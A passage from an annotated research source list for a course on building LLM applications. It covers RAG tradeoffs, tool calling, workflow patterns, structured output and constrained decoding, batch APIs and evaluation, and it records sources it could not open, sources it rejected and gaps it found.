- **Long context vs RAG.** Li et al.: long context wins on quality, RAG wins on cost. Xu et al.: 4K plus retrieval ≈ 16K. Anthropic: under 200k tokens, put the whole knowledge base in the prompt. Gemini docs: provide everything up front, though several needles hurt. RULER and NoLiMa: effective context is often much shorter than advertised. Databricks: most models decline past 16–64k.
- **Lost in the middle.** Liu et al. frame it as a position effect (2023 models). Chroma's Context Rot (2025 models) says degradation depends on similarity, distractors and structure, not only position.
- **Cosine similarity.** OpenAI says the choice "typically doesn't matter much." Steck et al. show cosine can be arbitrary for some learned embeddings. Google notes dot product also carries popularity.
- **How to evaluate.** Liu and Chroma use labeled or synthetic retrieval metrics (recall, precision, IoU). RAGAS uses reference-free LLM judges. Both are useful, but they measure different things.
- **Citations.** Anthropic claims built-in citations beat custom ones by up to 15% (vendor claim). ALCE found half of answers lacked full citation support (2023 models). NN/g found users often don't click citations at all.
- **Streaming.** The AI SDK treats streaming as the default. NN/g found streaming dense answers can overwhelm users.
- **Filtering with ANN indexes.** pgvector 0.8 adds iterative scans to fix overfiltering. The SIGMOD 2026 study says graph indexes like HNSW pay high filter costs compared with clustering indexes.

### Couldn't open
- http://cormack.uwaterloo.ca/cormacksigir09-rrf.pdf (the RRF paper, via plg.uwaterloo.ca redirects): the PDF came back as binary and no text could be pulled out. https://dl.acm.org/doi/10.1145/1571941.1572114 and its /pdf/ URL returned 403. research.google/pubs has the metadata but no abstract. **The RRF primary is not verified.** Please open it in a browser.
- https://www.staff.city.ac.uk/~sbrp622/papers/foundations_bm25_review.pdf (Robertson & Zaragoza, "The Probabilistic Relevance Framework: BM25 and Beyond," 2009): binary PDF, no text. nowpublishers.com returned 403, and the IR Anthology page returned 404. **Not verified.**
- https://trec.nist.gov/pubs/trec8/papers/qa_report.pdf (Voorhees, TREC-8 QA report, origin of MRR): binary PDF, no text. The NIST landing page loads, but its abstract doesn't mention MRR.
- https://openai.com/index/new-embedding-models-and-api-updates/ and https://openai.com/index/why-language-models-hallucinate/: 403. I used the embeddings guide and the arXiv paper instead.
- https://huggingface.co/spaces/mteb/leaderboard: JavaScript only, so no rankings were visible.
- https://platform.claude.com/docs/en/docs/build-with-claude/prompt-engineering/long-context-tips: redirects to the full "Prompting best practices" page. The output was too large and I only saw the preview, so the long-context tips (documents at the top, query at the end) are not verified. The Gemini long-context doc covers the same advice.
- https://platform.claude.com/docs/en/build-with-claude/citations: loads, but only the opening section was readable (GA, all active models). Re-open it for full notes.
- https://jkatz05.com/post/postgres/pgvector-hybrid-search/ and https://qdrant.tech/articles/reranking/: 404 (URLs I guessed).

### Rejected
- aihero.dev AI Engineer Roadmap (updated 2025-03-18): what loaded was only the intro, with no retrieval content visible.
- Hugging Face "MTEB" blog (2022-10-19): its model advice (all-MiniLM, GTR) is outdated. MMTEB replaces it.
- MTEB paper arXiv 2210.07316 (last revised 2023-03): replaced by MMTEB. Cite it only for history.
- Crunchy Data "HNSW indexes with Postgres and pgvector" (2023-09-01): pgvector 0.5 era, and Katz's 2024 posts and the 0.8 notes cover the same ground with numbers.
- "Billion-scale similarity search with GPUs" (Faiss, 2017): replaced by "The Faiss library" (2024/2025).
- Cohere Rerank overview (docs.cohere.com): the page lacked token limits and usage guidance. Voyage's page is more useful. It does confirm rerank-v4.0-pro as Cohere's latest.
- OpenSearch hybrid search blog: no numbers, only a conditional claim that linear "can slightly outperform" RRF.
- Weaviate "Hybrid Search Explained" (2025-01-27): mostly repeats the fusion post, though it's useful for the alpha parameter.
- Hamel Husain & Shreya Shankar evals FAQ (updated 2026-09-21): the RAG section was cut off in what I received, so I couldn't check what it says about retrieval metrics. Worth re-opening, since it's current and relevant.
- Evidently AI MRR page: repeats Pinecone. Keep it only as an optional extra.
- Anthropic "Writing effective tools for agents" (2025-09-11) and "Building effective agents" (2024-12-19): they load, but belong to later phases.

### Gaps
- **reciprocal-rank-fusion and bm25:** the two primaries (Cormack et al. 2009, Robertson & Zaragoza 2009) are not verified. The nodes currently rest on Elastic docs and blog, Postgres docs and code. Open the PDFs by hand, or accept Elastic's formula plus its citation.
- **mrr:** no verified primary. Voorhees' TREC-8 PDF wouldn't parse, so Wikipedia and Pinecone are standing in.
- **embedding-models:** no verified, current head-to-head numbers for the models you'd actually pick (voyage-4 vs text-embedding-3 vs open models). The live leaderboard is JS-only, so plan to run your own comparison (Chroma's generative benchmarking method) and write it up as a decision record.
- **streaming-ui:** the sources are SDK docs plus one NN/g study. There's no primary research on loading states, or on how to show sources while an answer is still streaming.
- **lost-in-the-middle:** there's no controlled position study on 2026-era models. Context Rot (2025) is the newest I found.
- **pgvector "where it runs out":** there's no recent, independent benchmark of pgvector against dedicated vector databases at scale. The Katz posts are from 2024 and the SIGMOD 2026 study doesn't test pgvector's HNSW.
- **Possible missing node:** `query-rewriting` (flagged in tentative-shape.md) came up again in Anthropic's context-engineering post and Jason Liu's post. I didn't search for sources for it.

## Phase 3: Workflows and structured data

I opened every source below on 2026-09-23 except the ones under "Couldn't open". Where a page had no date, it says "undated, checked 2026-09-23".

### tool-calling (deep)
1. **How tool use works** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/agents-and-tools/tool-use/how-tool-use-works
   kind: docs · primary: yes
   Why: The clearest statement of the mechanism. Tool use is a contract, the model only sends a structured request, your code runs it, and the loop runs while `stop_reason == "tool_use"`. It also covers client vs server tools and when not to use tools.
   Checked: Current. It says "The model never executes anything on its own." It also says that if you're writing a regex to pull a decision out of model output, that should have been a tool call.
2. **Tool use with Claude (overview)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview
   kind: docs · primary: yes
   Why: The full request/response round trip in code, `tool_choice` options, and a table of hidden tool-use system-prompt tokens per model, which shows tools cost tokens.
   Checked: Current. Examples use claude-opus-5-5, and the table lists 286 to 804 extra tokens depending on model and tool_choice.
3. **Function calling guide** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/function-calling
   kind: docs · primary: yes
   Why: A second vendor's version of the same loop (5 steps), `tool_choice` modes (auto/required/forced/allowed/none), `parallel_tool_calls`, what strict mode needs (`additionalProperties: false`, every field required), and the advice to keep it under about 20 functions per turn.
   Checked: Current. OpenAI docs have moved to developers.openai.com.
4. **Tool use (chat templates)** by Hugging Face Transformers, undated, checked 2026-09-23
   https://huggingface.co/docs/transformers/main/en/chat_extras
   kind: docs · primary: yes (for how open models do it)
   Why: Shows what the APIs hide. The tool schema gets rendered into the prompt, and the model writes the tool call as plain text (`<tool_call>{...}</tool_call>`). This ties tool calling back to next-token prediction.
   Checked: Current `main` docs. It says a model "cannot actually call the tool itself".
5. **The Berkeley Function Calling Leaderboard (BFCL)** by Patil et al., ICML 2025 (PMLR 267), plus the live leaderboard (v4, updated 2026-04-12)
   https://proceedings.mlr.press/v267/patil25a.html · https://gorilla.cs.berkeley.edu/leaderboard.html
   kind: paper · primary: yes
   Why: The numbers for this node. It measures how often models call tools correctly, using AST checking. The finding is that single-turn calls are mostly solved but "memory, dynamic decision-making, and long-horizon reasoning remain open challenges."
   Checked: Paper is ICML 2025. Leaderboard is at v4, last updated 2026-04-12.

Also serves: agent-loop, tool-design, mcp, structured-output (#1, #2). Anthropic's "Writing effective tools for AI agents" (2025-09-11, https://www.anthropic.com/engineering/writing-tools-for-agents, opened) belongs to phase 5 `tool-design`, not here.

### llm-workflows (deep)
1. **Building effective agents** by Erik Schluntz and Barry Zhang (Anthropic), 2024-12-19
   https://www.anthropic.com/engineering/building-effective-agents
   kind: blog · primary: yes
   Why: The source for Phase 3's vocabulary. It separates workflows ("LLMs and tools are orchestrated through predefined code paths") from agents, and names chaining, routing, parallelization, orchestrator-workers and evaluator-optimizer.
   Checked: Still the page Anthropic points to. Nothing newer has replaced it.
2. **The Shift from Models to Compound AI Systems** by Zaharia, Khattab, Chen, Davis et al. (Berkeley AI Research), 2024-02-18
   https://bair.berkeley.edu/blog/2024/02/18/compound-ai-systems/
   kind: blog · primary: yes
   Why: Explains why products are built from several calls and not one bigger model: cost, fresh data, control, tunable quality. Gives numbers from AlphaCode 2, Medprompt and Gemini CoT@32 (90.04% vs 86.4% on MMLU).
   Checked: Its examples are dated early 2024, but the argument still holds.
3. **Code Generation with AlphaCodium: From Prompt Engineering to Flow Engineering** by Ridnik, Kredo, Friedman, 2024-01-16
   https://arxiv.org/abs/2401.08500
   kind: paper · primary: yes
   Why: The best single number for "a fixed multi-step flow beats one prompt". GPT-4 pass@5 went "from 19% with a single well-designed direct prompt to 44% with the AlphaCodium flow."
   Checked: Abstract matches. It's GPT-4 era, so present it as history.
4. **Basic Workflows notebook** by Anthropic (claude-cookbooks), last commit 2025-11-28
   https://github.com/anthropics/claude-cookbooks/blob/main/patterns/agents/basic_workflows.ipynb
   kind: code · primary: yes
   Why: `chain()`, `parallel()` and `route()` in about 40 lines of Python, which shows workflows are ordinary code. Good to redraw or re-run for the "add something of my own" part.
   Checked: Read the raw notebook. It says it is "not production code".

Also serves: prompt-chaining, parallel-calls, routing, evaluator-optimizer, agent-loop, when-not-to-use-agents.

### prompt-chaining (short)
1. See llm-workflows #1. It gives the definition and when to chain (fixed subtasks, trading latency for accuracy), with examples.
2. **Prompting best practices, "Chain complex prompts"** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices (section "Chain complex prompts")
   kind: docs · primary: yes
   Why: The current view. It says "Claude handles most multistep reasoning internally", and that explicit chaining is still useful when you need to inspect intermediate outputs or fix the pipeline's structure. The most common chain it names is generate, then review, then refine.
   Checked: The old `/chain-prompts` URL now redirects into this page. It covers models up to Opus 5.5 and Fable 5.1.

Optional third, for history: **AI Chains** by Wu, Terry, Cai, 2021-10-04 (v3 2022-03-17), CHI 2022, https://arxiv.org/abs/2110.01691 (paper, primary). It's the research origin of the idea, where "the output of one step becomes the input for the next". It has a 20-person user study and no API-era numbers.

Also serves: llm-workflows (#2 above as the counterweight), chain-of-thought, reasoning-models.

### parallel-calls (short)
1. See llm-workflows #1. It splits parallelization into two kinds, "sectioning" (for speed) and "voting" (for confidence), with examples.
2. **Self-Consistency Improves Chain of Thought Reasoning in Language Models** by Wang et al., 2022-03-21 (v4 2023-03-07), ICLR 2023
   https://arxiv.org/abs/2203.11171
   kind: paper · primary: yes
   Why: The primary source for voting. Sample several reasoning paths and take the majority answer. Gains: GSM8K +17.9%, SVAMP +11.0%, AQuA +12.2%.
   Checked: Abstract matches. The idea is still current, but the models it tested are old.

Worth adding as the counterpoint: **Are More LLM Calls All You Need?** by Chen, Davis, Hanin, Bailis, Stoica, Zaharia, Zou, 2024-03-04 (rev. 2024-06-04), https://arxiv.org/abs/2403.02419 (paper, primary). It found voting accuracy "can first increase but then decrease" as calls go up, because extra calls help easy questions and hurt hard ones.

Optional for the speed side: **Latency optimization** by OpenAI, undated, https://developers.openai.com/api/docs/guides/latency-optimization (docs, primary). "Parallelize" is one of its 7 principles, it discusses speculative execution, and it covers the tradeoff between combining and splitting requests. It gives no numbers for parallel calls.

Also serves: llm-latency, evaluator-optimizer.

### routing (deep)
1. See llm-workflows #1. Routing "classifies an input and directs it to a specialized followup task". It includes sending easy questions to a smaller model and hard ones to a bigger one.
2. **Ticket routing (use case guide)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/about-claude/use-case-guides/ticket-routing
   kind: docs · primary: yes
   Why: A full worked router. When an LLM beats a trained ML classifier, how to write the categories, success criteria, cascading classifiers once there are 20+ intents (more accurate, but slower), and pulling few-shot examples from a vector DB (71% to 93%).
   Checked: Current, recommends claude-haiku-4-5. Its code parses XML with regex, which the tool-use docs (tool-calling #1) now advise against.
3. **RouteLLM: Learning to Route LLMs with Preference Data** by Ong, Almahairi, Wu, Chiang, Wu, Gonzalez, Kadous, Stoica, 2024-06-26 (v4 2025-02-23)
   https://arxiv.org/abs/2406.18665
   kind: paper · primary: yes
   Why: Routing between a strong and a weak model to save money, with a trained router. It cuts cost "by over 2 times in certain cases" without losing quality. This is a different kind of routing from sending tickets to specialized prompts.
   Checked: Abstract matches. Latest version is v4.
4. See llm-workflows #4. `route()` makes one LLM call that reasons and then picks, and each route is its own specialist prompt.
5. **semantic-router** by Aurelio Labs, checked 2026-09-23
   https://github.com/aurelio-labs/semantic-router
   kind: code · primary: yes (for its own design)
   Why: The alternative with no LLM call. It embeds example phrases for each route and picks the nearest one. Useful when designing the question router for cost and latency.
   Checked: Actively maintained (about 2.4k commits). The speed claims are marketing, with no numbers given.

Also serves: classification, model-selection, semantic-search.

### evaluator-optimizer (deep)
1. See llm-workflows #1. It defines the pattern and gives two tests for fit: clear evaluation criteria, and feedback that demonstrably improves the output.
2. **Evaluator-Optimizer notebook** by Anthropic (claude-cookbooks), last commit 2025-11-28
   https://github.com/anthropics/claude-cookbooks/blob/main/patterns/agents/evaluator_optimizer.ipynb
   kind: code · primary: yes
   Why: A generator and an evaluator that returns `PASS / NEEDS_IMPROVEMENT / FAIL` plus feedback, with past attempts fed back into the next try.
   Checked: Read the raw notebook. Its `while True:` loop has no cap on iterations, and a real build needs one. That's worth pointing out in the article.
3. **Self-Refine: Iterative Refinement with Self-Feedback** by Madaan et al., 2023-03-30 (v2 2023-05-25)
   https://arxiv.org/abs/2303.17651
   kind: paper · primary: yes
   Why: The case for the pattern: about 20% absolute average gain over single-shot output across 7 tasks, with one model generating, critiquing and refining.
   Checked: Abstract matches. Models tested were GPT-3.5 and GPT-4.
4. **Large Language Models Cannot Self-Correct Reasoning Yet** by Huang, Chen, Mishra, Zheng, Yu, Song, Zhou, 2023-10-03 (rev. 2024-03-14), ICLR 2024
   https://arxiv.org/abs/2310.01798
   kind: paper · primary: yes
   Why: The case against. Without external feedback, models "struggle to self-correct" and sometimes get worse. The design lesson for the grounding check is to give the evaluator something external to check against, such as the retrieved sources.
   Checked: Abstract matches.
5. See llm-workflows #3. AlphaCodium's evaluator is external: it runs real tests. That's the strongest version of the pattern.
6. See prompt-chaining #2. Anthropic's current docs describe generate, then review against criteria, then refine, as separate calls.

Also serves: grounding, llm-as-judge, agent-evals.

### extraction (deep)
1. **Structured outputs** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/structured-outputs
   kind: docs · primary: yes
   Why: The mechanism and its limits. It uses constrained decoding with a compiled grammar, the first request takes longer, and compiled grammars are cached for 24h. It covers JSON outputs vs `strict: true` tools. Unsupported: recursive schemas, min/max, minLength/maxLength.
   Checked: GA. The parameter moved from `output_format` to `output_config.format`. Launch history: **Structured outputs on the Claude Developer Platform**, 2025-11-14, public beta, GA on 2026-02-04 (https://claude.com/blog/structured-outputs-on-the-claude-developer-platform, opened).
2. **Structured model outputs** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/structured-outputs
   kind: docs · primary: yes
   Why: The second vendor. It explains JSON mode vs Structured Outputs ("only Structured Outputs ensure schema adherence"), the `refusal` field that lets code detect refusals, and extra latency on the first request with a new schema.
   Checked: Current. It now recommends a gpt-6 model for new projects.
3. **Introducing LangExtract** by Akshay Goel and Atilla Kiraly (Google), 2025-07-30
   https://developers.googleblog.com/en/introducing-langextract-a-gemini-powered-information-extraction-library/
   kind: blog · primary: yes
   Why: Covers extraction problems beyond schemas: source grounding ("Every extracted entity is mapped back to its exact character offsets"), chunking plus multiple passes for recall on long documents, and few-shot examples. This matters for the link suggester.
   Checked: Repo still active (last commit 2026-09-21).
4. **Instructor** by Jason Liu and contributors (567-labs), latest release v1.17.0 on 2026-09-09
   https://python.useinstructor.com/
   kind: docs/code · primary: yes
   Why: The popular library way to do it. Define a Pydantic model and get validated objects back, with retries across providers.
   Checked: Active, recent release.
5. **Extracting structured JSON using tool use (cookbook)** by Alex Albert (Anthropic), 2024-04-03
   https://platform.claude.com/cookbook/tool-use-extracting-structured-json
   kind: code · primary: yes
   Why: The older way: force a tool with `tool_choice` so the tool's input becomes your JSON. Its examples cover summaries, entities, sentiment and classification. Useful to show how extraction worked before native structured outputs.
   Checked: Still live, but it predates `strict: true` and structured outputs, so treat it as history.
6. **Task-Specific LLM Evals that Do & Don't Work** by Eugene Yan, 2024-03
   https://eugeneyan.com/writing/evals/
   kind: blog · primary: no
   Why: How to score extraction and classification: precision, recall, ROC-AUC and PR-AUC. It says a model "can have high ROC-AUC and PR-AUC but still not be suitable for production."
   Checked: Still accurate.

Also serves: structured-output, schema-validation, classification, grounding, evals.

### classification (short)
1. See routing #2. It covers when an LLM beats a trained classifier, how to write categories, and cascading classifiers once there are 20+ classes.
2. **Classification with Claude (cookbook)** by Anthropic, 2024-05-19 (code since updated to Haiku 4.5)
   https://platform.claude.com/cookbook/capabilities-classification-guide
   kind: code · primary: yes
   Why: One accuracy number per step on 10-class insurance tickets: random about 10%, simple prompt about 70%, retrieved few-shot examples 94%, plus chain of thought 97%. It then checks the result with Promptfoo.
   Checked: Live. The model string was updated to `claude-haiku-4-5`. The test set is only 68 examples, and its numbers differ from the 71% to 93% the ticket guide quotes for "the same recipe".

Optional: extraction #6 for metrics. The Vercel AI SDK `Output.choice()` (https://ai-sdk.dev/docs/ai-sdk-core/generating-structured-data, opened, docs show AI SDK v7) shows classification as a structured-output type in TypeScript.

Also serves: routing, few-shot-prompting, evals.

### constrained-decoding (deep)
1. **Efficient Guided Generation for Large Language Models** by Brandon T. Willard and Rémi Louf, 2023-07-19 (rev. 2023-08-19)
   https://arxiv.org/abs/2307.09702
   kind: paper · primary: yes
   Why: The base mechanism. Turn a regex or grammar into a finite-state machine and index it over the vocabulary, so each step knows which tokens are allowed and masks the rest. This became Outlines.
   Checked: Abstract matches. Newer engines build on this.
2. **XGrammar: Flexible and Efficient Structured Generation Engine for LLMs** by Dong, Ruan, Cai, Lai, Xu, Zhao, Chen, 2024-11-22 (v3 2025-05-12), MLSys 2025
   https://arxiv.org/abs/2411.15100
   kind: paper · primary: yes
   Why: How context-free grammars (needed for nested JSON) got fast. It splits tokens into "context-independent tokens that can be prechecked" and ones checked at runtime, for "up to 100x speedup".
   Checked: v3 is current.
3. **llguidance** by guidance-ai (Microsoft), v1.0.0 on 2025-06-23
   https://github.com/guidance-ai/llguidance
   kind: code · primary: yes
   Why: The engine that serves real traffic. It computes a token mask in about 50μs for a 128k vocabulary, and the README lists integrations with OpenAI Structured Outputs (May 2025), vLLM, SGLang and llama.cpp. That makes the vendor features concrete.
   Checked: Active.
4. **JSONSchemaBench** by Geng, Cooper, Moskal, Jenkins, Berman, Ranchin, West, Horvitz, Nori, 2025-01-18 (v3 2025-02-27)
   https://arxiv.org/abs/2501.10868
   kind: paper · primary: yes
   Why: The comparison numbers. It tests 10k real schemas across Guidance, Outlines, llama.cpp, XGrammar, OpenAI and Gemini, measuring coverage, compile time (Outlines 3.5 to 8s, Guidance about 0s) and time per token. It found constrained decoding "achieves higher performance than the unconstrained setting" on GSM8K, Last Letter and Shuffle Objects.
   Checked: v3. Several authors (Moskal, Nori) work on Guidance, which came out on top. Say so in the article.
5. **Let Me Speak Freely? A Study on the Impact of Format Restrictions on Performance of LLMs** by Tam, Wu, Tsai, Lin, Lee, Chen, 2024-08-05 (v3 2024-10-14)
   https://arxiv.org/abs/2408.02442
   kind: paper · primary: yes
   Why: The main claim that constrained output hurts quality: "a significant decline in LLMs reasoning abilities under format restrictions", worse the stricter the format.
   Checked: v3. It's the paper everyone cites for this claim.
6. **Say What You Mean: A Response to 'Let Me Speak Freely'** by Will Kurt (.txt, the Outlines team), undated, checked 2026-09-23
   https://blog.dottxt.ai/say-what-you-mean.html
   kind: blog · primary: yes (Outlines builders), with a vendor interest
   Why: The rebuttal. It says the paper used different prompts for the two setups and mixed up JSON mode with structured generation. Its re-run shows structured output equal or better (GSM8K 0.77 vs 0.78, Last Letter 0.73 vs 0.77).
   Checked: The old blog.dottxt.co address redirects here.

Worth adding for the "why": **Guiding LLMs The Right Way (DOMINO)** by Beurer-Kellner, Fischer, Vechev, 2024-02-07, https://arxiv.org/abs/2403.06988 (paper, primary). It argues that quality loss comes from constraints that don't line up with subword token boundaries, so it's a problem in how engines are built, not in constraining itself.

Also serves: structured-output, sampling, tokenization, extraction, schema-validation.

### schema-validation (short)
1. **Validation and Reasking** by Instructor, undated, checked 2026-09-23 (library v1.17.0, 2026-09-09)
   https://python.useinstructor.com/concepts/reask_validation/
   kind: docs · primary: yes
   Why: The mechanism in one page. On a `ValidationError` it appends the bad response and the error to the messages and asks again, up to `max_retries`. `llm_validator` adds validation rules that an LLM checks.
   Checked: Current.
2. **Output (Pydantic AI)** by Pydantic, undated, checked 2026-09-23
   https://pydantic.dev/docs/ai/core-concepts/output/
   kind: docs · primary: yes
   Why: Names three ways to get structured output (tool, native, prompted) and ranks tool output as the most reliable default. It covers output validators and `ModelRetry`, with a retry budget of 1 by default.
   Checked: The old ai.pydantic.dev/output/ URL now redirects here.

Optional, and useful for the "compare with constrained-decoding" part: **Gemini structured output** (https://ai.google.dev/gemini-api/docs/structured-output, docs, primary, opened) says "always validate values in your application." Hamel Husain's **"Fuck You, Show Me The Prompt"** (2024-02-14, https://hamel.dev/blog/posts/prompt/, blog, primary: no) found Instructor used 3 API calls to fix one invalid output, which shows retries cost calls.

Also serves: structured-output, extraction, retries, code-based-evals.

### batch-api (short)
1. **Batch processing (Message Batches API)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/batch-processing
   kind: docs · primary: yes
   Why: "All usage is charged at 50% of the standard API prices." Limits are 100,000 requests or 256 MB, most batches finish within 1h, they expire at 24h, and results are kept 29 days. The discount stacks with prompt caching, with cache hits from 30% to 98% (best effort).
   Checked: Current.
2. **Batch API** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/batch
   kind: docs · primary: yes
   Why: The second vendor: a JSONL file with a `custom_id` per line, a 24h window, 50% discount, 50,000 requests or 200 MB, and it covers endpoints beyond chat (embeddings, moderation, images, video).
   Checked: Current.

Optional third: **Gemini Batch API** (https://ai.google.dev/gemini-api/docs/batch-api, opened, updated 2026-09-17). Also 50% off with a 24h target, input inline under 20MB or JSONL files up to 2GB, and it supports context caching.

Also serves: token-pricing, prompt-caching, synthetic-test-data, offline-evals (running eval sets cheaply).

### Disagreements and tensions
- **Does constrained decoding hurt quality?** Let Me Speak Freely says yes, reasoning drops under format limits. The .txt rebuttal and JSONSchemaBench say no, it's the same or slightly better. DOMINO offers a reason they differ: bad engines mis-align constraints with tokens. Everyone with a stake is on one side: .txt builds Outlines, and JSONSchemaBench authors build Guidance.
- **How fast is constrained decoding?** Willard & Louf claim "little overhead". JSONSchemaBench measured Outlines at 3.5 to 8s to compile a grammar and the slowest time per token. XGrammar and llguidance claim near-zero cost per token. The vendors' docs (Anthropic, OpenAI) admit the first request with a new schema is slower.
- **Self-correction.** Self-Refine reports about +20%. Huang et al. say it fails without external feedback and can make things worse. This matters for the grounding check: the evaluator needs the sources.
- **More calls.** Self-consistency, and "More Agents Is All You Need", say accuracy keeps rising with more votes. Chen et al. show it can rise and then fall.
- **Do we still need chaining?** Building effective agents (2024) and AlphaCodium favor fixed multi-step flows. Anthropic's 2026 prompting docs say current models handle "most multistep reasoning internally" and keep chaining for when you need to inspect intermediate output. The dates explain part of this.
- **"No retries needed" vs "always validate".** Anthropic's structured outputs docs say "No retries needed for schema violations". Gemini says always validate values in your own code. Both are right: constrained decoding guarantees the shape, not correct values. Claude also doesn't enforce min/max or length limits, so validation after the fact is still needed.
- **Regex parsing vs tools.** Anthropic's ticket-routing guide parses `<intent>` tags with regex. Anthropic's tool-use docs say that if you're writing a regex to pull out a decision, it should be a tool call.
- **Which structured-output method is most reliable?** Pydantic AI makes tool output the default and calls it the most reliable. Anthropic and OpenAI now push native strict schemas.
- **Classification numbers.** The ticket guide says the retrieval-examples recipe goes from 71% to 93%. The cookbook itself reports 70%, then 94%, then 97% with chain of thought, on 68 test examples.

### Couldn't open
- https://openai.com/index/introducing-structured-outputs-in-the-api/ — 403 from WebFetch and from curl, and web.archive.org is blocked. The launch date (2024-08-06) and the "100% vs under 40%" eval numbers appeared only in search snippets. Don't cite them. The OpenAI structured outputs guide (extraction #2) and llguidance's README (it now powers OpenAI Structured Output) stand in.

### Rejected
- **The AI Engineer Roadmap** (aihero.dev, updated 2025-03-18): a landing page with no content on these topics, just links to a Vercel AI SDK tutorial.
- **Toolformer** (arXiv 2302.04761): about training models to use tools. Out of scope for building on APIs.
- **OpenAI cookbook "Introduction to Structured Outputs"**: no date or author, and it repeats the docs with no mechanism or numbers.
- **More Agents Is All You Need** (arXiv 2402.05120, TMLR): real, but it overlaps self-consistency. Chen et al. is the better second paper because it disagrees.
- **Eugene Yan, "Prompting Fundamentals"** (2024-05): a secondary retelling of the AlphaCodium result. Cite the paper directly.
- **Medium, Okoone and aibase write-ups** of OpenAI's launch: secondary, and primary sources exist.
- **Vercel AI SDK structured data docs**: opened and current (v7, `generateObject` replaced by `output` on `generateText`), but they add nothing beyond Instructor and Pydantic AI unless the site is built in TypeScript. If it is, it's a good docs source for extraction and classification.

### Gaps
- **parallel-calls**: there are good papers on voting, but no primary source with measured latency savings from running calls in parallel. OpenAI's latency guide is qualitative.
- **prompt-chaining**: no recent (2025–2026) measurement showing whether chaining still beats one call on current models. The newest numbers (AlphaCodium) are from the GPT-4 era.
- **extraction**: no benchmark with numbers for extraction quality. A search turned up LLMStructBench (arXiv 2602.14743), but I didn't open it, so it's unverified.
- **classification**: no source from Eugene Yan or Hamel Husain specifically on LLM classifiers. I also found no source comparing an LLM against a small fine-tuned classifier on cost and accuracy, which is the real design choice for the router.
- **tool-calling**: I opened the BFCL paper's abstract page and the leaderboard, but not the full PDF or v3/v4 blog posts. Open those before quoting any category scores.

## Phase 4: Evals and choosing models

I opened every source below on 2026-09-23 unless it is listed under "Couldn't open".

**Note on dates for the Hamel/Shankar evals FAQ.** The main page now says "published 2026-09-18, modified 2026-09-21". The single-question pages carry earlier dates (2025-05-29 to 2025-06-29, some modified 2026-09-01), and a PDF version is dated 2025-05-28. It looks like a republished, maintained page. When you cite it, cite the single-question URLs, which have stable dates.

### evals (deep)
1. **Your AI Product Needs Evals** by Hamel Husain, 2024-03-29
   https://hamel.dev/blog/posts/evals/
   kind: blog · primary: yes
   Why: The three-level model (unit-test assertions → human/model eval → A/B tests), plus the case for logging traces and removing friction from looking at data.
   Checked: Opened. Quote seen: "You must remove all friction from the process of looking at data." Still the standard intro piece, and later FAQ pages build on it.
2. **Demystifying evals for AI agents** by Mikaela Grace, Jeremy Hadfield, Rodrigo Olivares, Jiri De Jonghe (Anthropic), 2026-01-09
   https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents
   kind: blog · primary: yes
   Why: Three grader types (code, model, human). Capability evals vs regression evals ("An eval at 100% tracks regressions but provides no signal for improvement"). pass@k vs pass^k. A pros and cons table of offline and online methods. "20-50 simple tasks drawn from real failures is a great start."
   Checked: Opened. Current, and the newest primary piece here.
3. **Define success criteria and build evaluations** by Anthropic docs, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/docs/test-and-evaluate/develop-tests (the old docs.anthropic.com URL now 301s here)
   kind: docs · primary: yes
   Why: Design principles (task-specific, automate, "prioritize volume over quality"), with worked graders: exact match, cosine similarity, ROUGE-L, LLM Likert/binary/ordinal.
   Checked: Opened. Live on the new platform.claude.com domain.
4. **AI Evals FAQ** by Hamel Husain and Shreya Shankar (see the date note above)
   https://hamel.dev/blog/posts/evals-faq/
   kind: blog · primary: yes
   Why: The most practical single reference. "we've spent 60-80% of our development time on error analysis and evaluation". Against generic metrics: "Generic evaluations waste time and create false confidence".
   Checked: Opened the index and five sub-pages. Maintained through 2026-09.
5. **Evaluation best practices** by OpenAI docs, undated
   https://developers.openai.com/api/docs/guides/evaluation-best-practices (redirected from platform.openai.com)
   kind: docs · primary: yes
   Why: A second vendor's process (objective → dataset → metrics → compare → continuous eval) and a list of anti-patterns (generic metrics, vibe-based evals). Useful to set against Anthropic's docs.
   Checked: Opened. No date. It mentions deprecation timelines into 2026-11, so it is current.
6. **Your App Is Only As Good As Its Evals** by aihero.dev (no author named), updated 2024-11-18
   https://www.aihero.dev/what-are-evals
   kind: blog · primary: no
   Why: Frames evals in TypeScript/unit-test terms for a full-stack reader: "Evals are the AI engineer's unit tests." Uses graded scores rather than pass/fail, which gives you a disagreement to write about.
   Checked: Opened. Aimed at newcomers; about two years old.
Also serves: success-criteria, code-based-evals, offline-evals, online-evals, data-flywheel, agent-evals (phase 5)

### success-criteria (short)
1. **Define success criteria** by Anthropic docs, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/docs/test-and-evaluate/define-success
   kind: docs · primary: yes
   Why: Criteria should be specific, measurable, achievable and relevant. Lists eight common criteria (task fidelity, consistency, relevance, tone, privacy, context use, latency, price). "Most use cases need multidimensional evaluation along several success criteria."
   Checked: Opened. Live after the redirect.
2. **Who Validates the Validators?** by Shreya Shankar, J.D. Zamfirescu-Pereira, Björn Hartmann, Aditya Parameswaran, Ian Arawjo, arXiv 2024-04-18
   https://arxiv.org/abs/2404.12272
   kind: paper · primary: yes
   Why: The counterweight to "write criteria first". Criteria drift means some criteria only show up after you look at outputs: "Some criteria appears dependent on the specific LLM outputs observed".
   Checked: Opened the abstract page. v1 2024-04-18.
Also serves: llm-as-judge, human-review, evals

### code-based-evals (short)
1. See evals #3 (Anthropic develop-tests). Worked exact-match, cosine and ROUGE-L graders, with thresholds (e.g. "F1 score ≥ 0.85").
2. **What We've Learned From A Year of Building with LLMs** by Eugene Yan, Bryan Bischof, Charles Frye, Hamel Husain, Jason Liu, Shreya Shankar, 2024-06-08
   https://applied-llms.org/
   kind: blog · primary: yes
